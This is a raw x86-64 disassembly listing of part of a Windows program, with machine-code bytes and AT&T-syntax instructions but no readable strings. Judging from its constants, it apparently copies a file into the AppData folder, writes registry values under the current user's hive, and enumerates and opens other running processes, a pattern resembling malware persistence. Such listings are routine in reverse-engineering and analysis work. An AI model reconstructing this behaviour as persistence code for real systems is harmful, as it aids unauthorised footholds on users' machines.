   140003572:	85 c0                	test   %eax,%eax
   140003574:	0f 85 e6 01 00 00    	jne    0x140003760
   14000357a:	48 8d 74 24 34       	lea    0x34(%rsp),%rsi
   14000357f:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003584:	45 31 c9             	xor    %r9d,%r9d
   140003587:	45 31 c0             	xor    %r8d,%r8d
   14000358a:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   14000358f:	48 8b 2d c2 8f 01 00 	mov    0x18fc2(%rip),%rbp        # 0x14001c558
   140003596:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000359b:	48 8d 15 a3 0e 01 00 	lea    0x10ea3(%rip),%rdx        # 0x140014445
   1400035a2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400035a7:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400035ae:	00 00 
   1400035b0:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400035b7:	00 00 
   1400035b9:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   1400035c0:	00 00 
   1400035c2:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   1400035c9:	00 00 
   1400035cb:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   1400035d2:	00 00 00 00 00 
   1400035d7:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   1400035de:	00 00 00 00 00 
   1400035e3:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
   1400035ea:	00 00 00 00 00 
   1400035ef:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400035f6:	00 00 00 00 00 
   1400035fb:	48 c7 84 24 a0 00 00 	movq   $0x0,0xa0(%rsp)
   140003602:	00 00 00 00 00 
   140003607:	48 c7 84 24 a8 00 00 	movq   $0x0,0xa8(%rsp)
   14000360e:	00 00 00 00 00 
   140003613:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   14000361a:	00 00 00 00 00 
   14000361f:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   140003626:	00 00 00 00 00 
   14000362b:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   140003632:	00 00 00 00 00 
   140003637:	48 c7 84 24 c8 00 00 	movq   $0x0,0xc8(%rsp)
   14000363e:	00 00 00 00 00 
   140003643:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   14000364a:	00 00 00 00 00 
   14000364f:	48 c7 84 24 d8 00 00 	movq   $0x0,0xd8(%rsp)
   140003656:	00 00 00 00 00 
   14000365b:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140003662:	00 00 
   140003664:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000366b:	00 00 
   14000366d:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140003674:	00 00 
   140003676:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   14000367d:	00 00 
   14000367f:	c7 44 24 34 80 00 00 	movl   $0x80,0x34(%rsp)
   140003686:	00 
   140003687:	ff d5                	call   *%rbp
   140003689:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000368e:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140003693:	45 31 c9             	xor    %r9d,%r9d
   140003696:	45 31 c0             	xor    %r8d,%r8d
   140003699:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000369e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400036a3:	48 8d 15 a7 0d 01 00 	lea    0x10da7(%rip),%rdx        # 0x140014451
   1400036aa:	c7 44 24 34 20 00 00 	movl   $0x20,0x34(%rsp)
   1400036b1:	00 
   1400036b2:	ff d5                	call   *%rbp
   1400036b4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400036b9:	ff 15 71 8e 01 00    	call   *0x18e71(%rip)        # 0x14001c530
   1400036bf:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400036c4:	49 89 f9             	mov    %rdi,%r9
   1400036c7:	48 89 d9             	mov    %rbx,%rcx
   1400036ca:	48 8b 35 2f 91 01 00 	mov    0x1912f(%rip),%rsi        # 0x14001c800
   1400036d1:	4c 8d 05 8c 0d 01 00 	lea    0x10d8c(%rip),%r8        # 0x140014464
   1400036d8:	ba 00 01 00 00       	mov    $0x100,%edx
   1400036dd:	ff d6                	call   *%rsi
   1400036df:	ba 00 01 00 00       	mov    $0x100,%edx
   1400036e4:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   1400036eb:	48 8d 8b 00 01 00 00 	lea    0x100(%rbx),%rcx
   1400036f2:	e8 19 f7 ff ff       	call   0x140002e10
   1400036f7:	48 8d 8b 00 02 00 00 	lea    0x200(%rbx),%rcx
   1400036fe:	e8 8d f8 ff ff       	call   0x140002f90
   140003703:	c7 44 24 60 40 00 00 	movl   $0x40,0x60(%rsp)
   14000370a:	00 
   14000370b:	48 89 f9             	mov    %rdi,%rcx
   14000370e:	ff 15 9c 8f 01 00    	call   *0x18f9c(%rip)        # 0x14001c6b0
   140003714:	48 8d ab 00 03 00 00 	lea    0x300(%rbx),%rbp
   14000371b:	85 c0                	test   %eax,%eax
   14000371d:	74 69                	je     0x140003788
   14000371f:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   140003724:	4c 8d 05 59 0d 01 00 	lea    0x10d59(%rip),%r8        # 0x140014484
   14000372b:	ba 20 00 00 00       	mov    $0x20,%edx
   140003730:	48 89 e9             	mov    %rbp,%rcx
   140003733:	49 c1 e9 14          	shr    $0x14,%r9
   140003737:	ff d6                	call   *%rsi
   140003739:	c6 83 1f 03 00 00 00 	movb   $0x0,0x31f(%rbx)
   140003740:	e8 6b f7 ff ff       	call   0x140002eb0
   140003745:	89 83 20 03 00 00    	mov    %eax,0x320(%rbx)
   14000374b:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   140003752:	5b                   	pop    %rbx
   140003753:	5e                   	pop    %rsi
   140003754:	5f                   	pop    %rdi
   140003755:	5d                   	pop    %rbp
   140003756:	c3                   	ret
   140003757:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000375e:	00 00 
   140003760:	48 8b 35 99 90 01 00 	mov    0x19099(%rip),%rsi        # 0x14001c800
   140003767:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   14000376c:	ba 00 01 00 00       	mov    $0x100,%edx
   140003771:	48 89 d9             	mov    %rbx,%rcx
   140003774:	4c 8d 05 f7 0c 01 00 	lea    0x10cf7(%rip),%r8        # 0x140014472
   14000377b:	ff d6                	call   *%rsi
   14000377d:	e9 5d ff ff ff       	jmp    0x1400036df
   140003782:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003788:	4c 8d 05 fd 0c 01 00 	lea    0x10cfd(%rip),%r8        # 0x14001448c
   14000378f:	ba 20 00 00 00       	mov    $0x20,%edx
   140003794:	48 89 e9             	mov    %rbp,%rcx
   140003797:	ff d6                	call   *%rsi
   140003799:	eb 9e                	jmp    0x140003739
   14000379b:	90                   	nop
   14000379c:	90                   	nop
   14000379d:	90                   	nop
   14000379e:	90                   	nop
   14000379f:	90                   	nop
   1400037a0:	55                   	push   %rbp
   1400037a1:	57                   	push   %rdi
   1400037a2:	56                   	push   %rsi
   1400037a3:	53                   	push   %rbx
   1400037a4:	48 81 ec 68 03 00 00 	sub    $0x368,%rsp
   1400037ab:	31 c9                	xor    %ecx,%ecx
   1400037ad:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400037b3:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   1400037b8:	48 8d 9c 24 50 02 00 	lea    0x250(%rsp),%rbx
   1400037bf:	00 
   1400037c0:	48 89 f2             	mov    %rsi,%rdx
   1400037c3:	ff 15 af 8e 01 00    	call   *0x18eaf(%rip)        # 0x14001c678
   1400037c9:	45 31 c9             	xor    %r9d,%r9d
   1400037cc:	45 31 c0             	xor    %r8d,%r8d
   1400037cf:	31 c9                	xor    %ecx,%ecx
   1400037d1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400037d6:	ba 1a 00 00 00       	mov    $0x1a,%edx
   1400037db:	ff 15 47 91 01 00    	call   *0x19147(%rip)        # 0x14001c928
   1400037e1:	85 c0                	test   %eax,%eax
   1400037e3:	0f 88 87 00 00 00    	js     0x140003870
   1400037e9:	48 8d ac 24 40 01 00 	lea    0x140(%rsp),%rbp
   1400037f0:	00 
   1400037f1:	48 8b 3d 08 90 01 00 	mov    0x19008(%rip),%rdi        # 0x14001c800
   1400037f8:	49 89 d9             	mov    %rbx,%r9
   1400037fb:	ba 04 01 00 00       	mov    $0x104,%edx
   140003800:	48 8d 05 9f 0c 01 00 	lea    0x10c9f(%rip),%rax        # 0x1400144a6
   140003807:	48 89 e9             	mov    %rbp,%rcx
   14000380a:	4c 8d 05 8f 0c 01 00 	lea    0x10c8f(%rip),%r8        # 0x1400144a0
   140003811:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003816:	ff d7                	call   *%rdi
   140003818:	48 8d 05 95 0c 01 00 	lea    0x10c95(%rip),%rax        # 0x1400144b4
   14000381f:	49 89 e9             	mov    %rbp,%r9
   140003822:	48 89 d9             	mov    %rbx,%rcx
   140003825:	4c 8d 05 74 0c 01 00 	lea    0x10c74(%rip),%r8        # 0x1400144a0
   14000382c:	ba 04 01 00 00       	mov    $0x104,%edx
   140003831:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003836:	c6 84 24 43 02 00 00 	movb   $0x0,0x243(%rsp)
   14000383d:	00 
   14000383e:	ff d7                	call   *%rdi
   140003840:	c6 84 24 53 03 00 00 	movb   $0x0,0x353(%rsp)
   140003847:	00 
   140003848:	48 89 da             	mov    %rbx,%rdx
   14000384b:	48 89 f1             	mov    %rsi,%rcx
   14000384e:	ff 15 bc 8f 01 00    	call   *0x18fbc(%rip)        # 0x14001c810
   140003854:	85 c0                	test   %eax,%eax
   140003856:	0f 94 c0             	sete   %al
   140003859:	0f b6 c0             	movzbl %al,%eax
   14000385c:	48 81 c4 68 03 00 00 	add    $0x368,%rsp
   140003863:	5b                   	pop    %rbx
   140003864:	5e                   	pop    %rsi
   140003865:	5f                   	pop    %rdi
   140003866:	5d                   	pop    %rbp
   140003867:	c3                   	ret
   140003868:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000386f:	00 
   140003870:	31 c0                	xor    %eax,%eax
   140003872:	eb e8                	jmp    0x14000385c
   140003874:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000387b:	00 00 00 00 
   14000387f:	90                   	nop
   140003880:	41 54                	push   %r12
   140003882:	55                   	push   %rbp
   140003883:	57                   	push   %rdi
   140003884:	56                   	push   %rsi
   140003885:	53                   	push   %rbx
   140003886:	48 81 ec 80 03 00 00 	sub    $0x380,%rsp
   14000388d:	4c 8d 25 2e 0c 01 00 	lea    0x10c2e(%rip),%r12        # 0x1400144c2
   140003894:	48 8b 35 65 8f 01 00 	mov    0x18f65(%rip),%rsi        # 0x14001c800
   14000389b:	ba 04 01 00 00       	mov    $0x104,%edx
   1400038a0:	4c 8d 05 f9 0b 01 00 	lea    0x10bf9(%rip),%r8        # 0x1400144a0
   1400038a7:	48 89 cb             	mov    %rcx,%rbx
   1400038aa:	49 89 c9             	mov    %rcx,%r9
   1400038ad:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400038b2:	48 8d bc 24 70 02 00 	lea    0x270(%rsp),%rdi
   1400038b9:	00 
   1400038ba:	48 8d ac 24 60 01 00 	lea    0x160(%rsp),%rbp
   1400038c1:	00 
   1400038c2:	48 89 e9             	mov    %rbp,%rcx
   1400038c5:	ff d6                	call   *%rsi
   1400038c7:	49 89 d9             	mov    %rbx,%r9
   1400038ca:	ba 04 01 00 00       	mov    $0x104,%edx
   1400038cf:	48 89 f9             	mov    %rdi,%rcx
   1400038d2:	4c 8d 05 c7 0b 01 00 	lea    0x10bc7(%rip),%r8        # 0x1400144a0
   1400038d9:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400038de:	ff d6                	call   *%rsi
   1400038e0:	45 31 c9             	xor    %r9d,%r9d
   1400038e3:	45 31 c0             	xor    %r8d,%r8d
   1400038e6:	c7 44 24 28 06 00 00 	movl   $0x6,0x28(%rsp)
   1400038ed:	00 
   1400038ee:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   1400038f5:	00 
   1400038f6:	ba 00 00 00 40       	mov    $0x40000000,%edx
   1400038fb:	48 89 f9             	mov    %rdi,%rcx
   1400038fe:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003905:	00 00 
   140003907:	ff 15 eb 8c 01 00    	call   *0x18ceb(%rip)        # 0x14001c5f8
   14000390d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003911:	48 89 c3             	mov    %rax,%rbx
   140003914:	0f 84 86 01 00 00    	je     0x140003aa0
   14000391a:	4c 8d 64 24 60       	lea    0x60(%rsp),%r12
   14000391f:	41 b8 00 32 00 00    	mov    $0x3200,%r8d
   140003925:	48 89 c1             	mov    %rax,%rcx
   140003928:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000392f:	00 00 
   140003931:	48 8d 15 08 0d 01 00 	lea    0x10d08(%rip),%rdx        # 0x140014640
   140003938:	4d 89 e1             	mov    %r12,%r9
   14000393b:	ff 15 1f 8e 01 00    	call   *0x18e1f(%rip)        # 0x14001c760
   140003941:	48 89 d9             	mov    %rbx,%rcx
   140003944:	ff 15 96 8c 01 00    	call   *0x18c96(%rip)        # 0x14001c5e0
   14000394a:	81 7c 24 60 00 32 00 	cmpl   $0x3200,0x60(%rsp)
   140003951:	00 
   140003952:	0f 85 48 01 00 00    	jne    0x140003aa0
   140003958:	4c 8d 0d 79 0b 01 00 	lea    0x10b79(%rip),%r9        # 0x1400144d8
   14000395f:	ba 00 01 00 00       	mov    $0x100,%edx
   140003964:	4c 89 e1             	mov    %r12,%rcx
   140003967:	4c 8d 05 91 0b 01 00 	lea    0x10b91(%rip),%r8        # 0x1400144ff
   14000396e:	ff d6                	call   *%rsi
   140003970:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003975:	45 31 c9             	xor    %r9d,%r9d
   140003978:	45 31 c0             	xor    %r8d,%r8d
   14000397b:	48 8b 1d b6 8b 01 00 	mov    0x18bb6(%rip),%rbx        # 0x14001c538
   140003982:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003987:	4c 89 e2             	mov    %r12,%rdx
   14000398a:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003991:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140003998:	00 00 
   14000399a:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400039a1:	00 00 
   1400039a3:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   1400039aa:	00 
   1400039ab:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400039b2:	00 
   1400039b3:	ff d3                	call   *%rbx
   1400039b5:	85 c0                	test   %eax,%eax
   1400039b7:	0f 85 e3 00 00 00    	jne    0x140003aa0
   1400039bd:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400039c2:	4c 8b 25 67 8b 01 00 	mov    0x18b67(%rip),%r12        # 0x14001c530
   1400039c9:	41 ff d4             	call   *%r12
   1400039cc:	4c 8d 0d 05 0b 01 00 	lea    0x10b05(%rip),%r9        # 0x1400144d8
   1400039d3:	ba 00 01 00 00       	mov    $0x100,%edx
   1400039d8:	48 89 f9             	mov    %rdi,%rcx
   1400039db:	4c 8d 05 3e 0b 01 00 	lea    0x10b3e(%rip),%r8        # 0x140014520
   1400039e2:	ff d6                	call   *%rsi
   1400039e4:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400039e9:	45 31 c9             	xor    %r9d,%r9d
   1400039ec:	45 31 c0             	xor    %r8d,%r8d
   1400039ef:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400039f4:	48 89 fa             	mov    %rdi,%rdx
   1400039f7:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   1400039fe:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140003a05:	00 00 
   140003a07:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003a0e:	00 00 
   140003a10:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140003a17:	00 
   140003a18:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140003a1f:	00 
   140003a20:	ff d3                	call   *%rbx
   140003a22:	85 c0                	test   %eax,%eax
   140003a24:	89 c3                	mov    %eax,%ebx
   140003a26:	75 78                	jne    0x140003aa0
   140003a28:	48 89 e9             	mov    %rbp,%rcx
   140003a2b:	e8 20 ee 00 00       	call   0x140012850
   140003a30:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003a35:	45 31 c0             	xor    %r8d,%r8d
   140003a38:	31 d2                	xor    %edx,%edx
   140003a3a:	83 c0 01             	add    $0x1,%eax
   140003a3d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003a43:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003a48:	48 8b 35 11 8b 01 00 	mov    0x18b11(%rip),%rsi        # 0x14001c560
   140003a4f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003a53:	ff d6                	call   *%rsi
   140003a55:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003a5a:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003a60:	45 31 c0             	xor    %r8d,%r8d
   140003a63:	48 8d 05 ee 0a 01 00 	lea    0x10aee(%rip),%rax        # 0x140014558
   140003a6a:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   140003a71:	00 
   140003a72:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003a77:	48 8d 15 cb 0a 01 00 	lea    0x10acb(%rip),%rdx        # 0x140014549
   140003a7e:	ff d6                	call   *%rsi
   140003a80:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140003a85:	41 ff d4             	call   *%r12
   140003a88:	89 d8                	mov    %ebx,%eax
   140003a8a:	48 81 c4 80 03 00 00 	add    $0x380,%rsp
   140003a91:	5b                   	pop    %rbx
   140003a92:	5e                   	pop    %rsi
   140003a93:	5f                   	pop    %rdi
   140003a94:	5d                   	pop    %rbp
   140003a95:	41 5c                	pop    %r12
   140003a97:	c3                   	ret
   140003a98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003a9f:	00 
   140003aa0:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140003aa5:	eb e1                	jmp    0x140003a88
   140003aa7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003aae:	00 00 
   140003ab0:	57                   	push   %rdi
   140003ab1:	56                   	push   %rsi
   140003ab2:	53                   	push   %rbx
   140003ab3:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140003aba:	4c 8d 0d 17 0a 01 00 	lea    0x10a17(%rip),%r9        # 0x1400144d8
   140003ac1:	48 8b 3d 38 8d 01 00 	mov    0x18d38(%rip),%rdi        # 0x14001c800
   140003ac8:	ba 00 01 00 00       	mov    $0x100,%edx
   140003acd:	4c 8d 05 4c 0a 01 00 	lea    0x10a4c(%rip),%r8        # 0x140014520
   140003ad4:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140003ad9:	48 89 d9             	mov    %rbx,%rcx
   140003adc:	ff d7                	call   *%rdi
   140003ade:	48 8b 35 5b 8a 01 00 	mov    0x18a5b(%rip),%rsi        # 0x14001c540
   140003ae5:	48 89 da             	mov    %rbx,%rdx
   140003ae8:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003aef:	ff d6                	call   *%rsi
   140003af1:	4c 8d 0d e0 09 01 00 	lea    0x109e0(%rip),%r9        # 0x1400144d8
   140003af8:	ba 00 01 00 00       	mov    $0x100,%edx
   140003afd:	48 89 d9             	mov    %rbx,%rcx
   140003b00:	4c 8d 05 f8 09 01 00 	lea    0x109f8(%rip),%r8        # 0x1400144ff
   140003b07:	ff d7                	call   *%rdi
   140003b09:	48 89 da             	mov    %rbx,%rdx
   140003b0c:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003b13:	ff d6                	call   *%rsi
   140003b15:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140003b1a:	45 31 c0             	xor    %r8d,%r8d
   140003b1d:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140003b23:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003b28:	48 8d 15 31 0a 01 00 	lea    0x10a31(%rip),%rdx        # 0x140014560
   140003b2f:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003b36:	ff 15 14 8a 01 00    	call   *0x18a14(%rip)        # 0x14001c550
   140003b3c:	85 c0                	test   %eax,%eax
   140003b3e:	74 10                	je     0x140003b50
   140003b40:	31 c0                	xor    %eax,%eax
   140003b42:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140003b49:	5b                   	pop    %rbx
   140003b4a:	5e                   	pop    %rsi
   140003b4b:	5f                   	pop    %rdi
   140003b4c:	c3                   	ret
   140003b4d:	0f 1f 00             	nopl   (%rax)
   140003b50:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003b55:	48 8d 15 32 0a 01 00 	lea    0x10a32(%rip),%rdx        # 0x14001458e
   140003b5c:	ff 15 e6 89 01 00    	call   *0x189e6(%rip)        # 0x14001c548
   140003b62:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003b67:	ff 15 c3 89 01 00    	call   *0x189c3(%rip)        # 0x14001c530
   140003b6d:	31 c0                	xor    %eax,%eax
   140003b6f:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   140003b76:	5b                   	pop    %rbx
   140003b77:	5e                   	pop    %rsi
   140003b78:	5f                   	pop    %rdi
   140003b79:	c3                   	ret
   140003b7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003b80:	41 57                	push   %r15
   140003b82:	41 56                	push   %r14
   140003b84:	41 55                	push   %r13
   140003b86:	41 54                	push   %r12
   140003b88:	55                   	push   %rbp
   140003b89:	57                   	push   %rdi
   140003b8a:	56                   	push   %rsi
   140003b8b:	53                   	push   %rbx
   140003b8c:	48 81 ec a8 04 00 00 	sub    $0x4a8,%rsp
   140003b93:	ff 15 c7 8a 01 00    	call   *0x18ac7(%rip)        # 0x14001c660
   140003b99:	45 31 c9             	xor    %r9d,%r9d
   140003b9c:	45 31 c0             	xor    %r8d,%r8d
   140003b9f:	31 c9                	xor    %ecx,%ecx
   140003ba1:	48 8b 2d 80 8d 01 00 	mov    0x18d80(%rip),%rbp        # 0x14001c928
   140003ba8:	89 c6                	mov    %eax,%esi
   140003baa:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003baf:	48 8d 9c 24 70 03 00 	lea    0x370(%rsp),%rbx
   140003bb6:	00 
   140003bb7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003bbc:	ff d5                	call   *%rbp
   140003bbe:	85 c0                	test   %eax,%eax
   140003bc0:	0f 88 65 01 00 00    	js     0x140003d2b
   140003bc6:	4c 8d 6c 24 40       	lea    0x40(%rsp),%r13
   140003bcb:	49 89 d9             	mov    %rbx,%r9
   140003bce:	ba 04 01 00 00       	mov    $0x104,%edx
   140003bd3:	4c 8b 35 26 8c 01 00 	mov    0x18c26(%rip),%r14        # 0x14001c800
   140003bda:	4c 8d 3d c5 08 01 00 	lea    0x108c5(%rip),%r15        # 0x1400144a6
   140003be1:	4c 89 e9             	mov    %r13,%rcx
   140003be4:	4c 8d 05 b5 08 01 00 	lea    0x108b5(%rip),%r8        # 0x1400144a0
   140003beb:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140003bf0:	41 ff d6             	call   *%r14
   140003bf3:	45 31 c9             	xor    %r9d,%r9d
   140003bf6:	45 31 c0             	xor    %r8d,%r8d
   140003bf9:	31 c9                	xor    %ecx,%ecx
   140003bfb:	c6 84 24 43 01 00 00 	movb   $0x0,0x143(%rsp)
   140003c02:	00 
   140003c03:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003c08:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003c0d:	ff d5                	call   *%rbp
   140003c0f:	85 c0                	test   %eax,%eax
   140003c11:	0f 88 14 01 00 00    	js     0x140003d2b
   140003c17:	4c 8d a4 24 60 02 00 	lea    0x260(%rsp),%r12
   140003c1e:	00 
   140003c1f:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140003c24:	49 89 d9             	mov    %rbx,%r9
   140003c27:	ba 04 01 00 00       	mov    $0x104,%edx
   140003c2c:	4c 8d 05 6d 08 01 00 	lea    0x1086d(%rip),%r8        # 0x1400144a0
   140003c33:	4c 89 e1             	mov    %r12,%rcx
   140003c36:	41 ff d6             	call   *%r14
   140003c39:	4c 8d bc 24 50 01 00 	lea    0x150(%rsp),%r15
   140003c40:	00 
   140003c41:	4d 89 e1             	mov    %r12,%r9
   140003c44:	ba 04 01 00 00       	mov    $0x104,%edx
   140003c49:	48 8d 05 64 08 01 00 	lea    0x10864(%rip),%rax        # 0x1400144b4
   140003c50:	4c 89 f9             	mov    %r15,%rcx
   140003c53:	c6 84 24 63 03 00 00 	movb   $0x0,0x363(%rsp)
   140003c5a:	00 
   140003c5b:	4c 8d 05 3e 08 01 00 	lea    0x1083e(%rip),%r8        # 0x1400144a0
   140003c62:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c67:	41 ff d6             	call   *%r14
   140003c6a:	31 d2                	xor    %edx,%edx
   140003c6c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003c71:	c6 84 24 53 02 00 00 	movb   $0x0,0x253(%rsp)
   140003c78:	00 
   140003c79:	e8 72 ed 00 00       	call   0x1400129f0
   140003c7e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003c82:	48 89 c5             	mov    %rax,%rbp
   140003c85:	0f 84 a0 00 00 00    	je     0x140003d2b
   140003c8b:	48 89 da             	mov    %rbx,%rdx
   140003c8e:	48 89 c1             	mov    %rax,%rcx
   140003c91:	c7 84 24 70 03 00 00 	movl   $0x130,0x370(%rsp)
   140003c98:	30 01 00 00 
   140003c9c:	e8 5f ec 00 00       	call   0x140012900
   140003ca1:	85 c0                	test   %eax,%eax
   140003ca3:	74 7c                	je     0x140003d21
   140003ca5:	0f 1f 00             	nopl   (%rax)
   140003ca8:	44 8b 84 24 78 03 00 	mov    0x378(%rsp),%r8d
   140003caf:	00 
   140003cb0:	45 85 c0             	test   %r8d,%r8d
   140003cb3:	74 5d                	je     0x140003d12
   140003cb5:	41 39 f0             	cmp    %esi,%r8d
   140003cb8:	74 58                	je     0x140003d12
   140003cba:	31 d2                	xor    %edx,%edx
   140003cbc:	b9 01 10 00 00       	mov    $0x1001,%ecx
   140003cc1:	ff 15 31 8a 01 00    	call   *0x18a31(%rip)        # 0x14001c6f8
   140003cc7:	48 85 c0             	test   %rax,%rax
   140003cca:	49 89 c6             	mov    %rax,%r14
   140003ccd:	74 43                	je     0x140003d12
   140003ccf:	31 c0                	xor    %eax,%eax
   140003cd1:	4c 89 e7             	mov    %r12,%rdi
   140003cd4:	31 d2                	xor    %edx,%edx
   140003cd6:	c7 44 24 3c 04 01 00 	movl   $0x104,0x3c(%rsp)
   140003cdd:	00 
   140003cde:	4c 8d a4 24 60 02 00 	lea    0x260(%rsp),%r12
   140003ce5:	00 
   140003ce6:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003ceb:	f3 48 ab             	rep stos %rax,(%rdi)
   140003cee:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   140003cf3:	4d 89 e0             	mov    %r12,%r8
   140003cf6:	4c 89 f1             	mov    %r14,%rcx
   140003cf9:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   140003cff:	ff 15 0b 8a 01 00    	call   *0x18a0b(%rip)        # 0x14001c710
   140003d05:	85 c0                	test   %eax,%eax
   140003d07:	75 37                	jne    0x140003d40
   140003d09:	4c 89 f1             	mov    %r14,%rcx
   140003d0c:	ff 15 ce 88 01 00    	call   *0x188ce(%rip)        # 0x14001c5e0
   140003d12:	48 89 da             	mov    %rbx,%rdx
   140003d15:	48 89 e9             	mov    %rbp,%rcx
   140003d18:	e8 db eb 00 00       	call   0x1400128f8
   140003d1d:	85 c0                	test   %eax,%eax
   140003d1f:	75 87                	jne    0x140003ca8
   140003d21:	48 89 e9             	mov    %rbp,%rcx
   140003d24:	ff 15 b6 88 01 00    	call   *0x188b6(%rip)        # 0x14001c5e0
   140003d2a:	90                   	nop
   140003d2b:	48 81 c4 a8 04 00 00 	add    $0x4a8,%rsp
   140003d32:	5b                   	pop    %rbx
   140003d33:	5e                   	pop    %rsi
   140003d34:	5f                   	pop    %rdi
   140003d35:	5d                   	pop    %rbp
   140003d36:	41 5c                	pop    %r12
   140003d38:	41 5d                	pop    %r13
   140003d3a:	41 5e                	pop    %r14
   140003d3c:	41 5f                	pop    %r15
   140003d3e:	c3                   	ret
   140003d3f:	90                   	nop
   140003d40:	4c 89 fa             	mov    %r15,%rdx
   140003d43:	4c 89 e1             	mov    %r12,%rcx
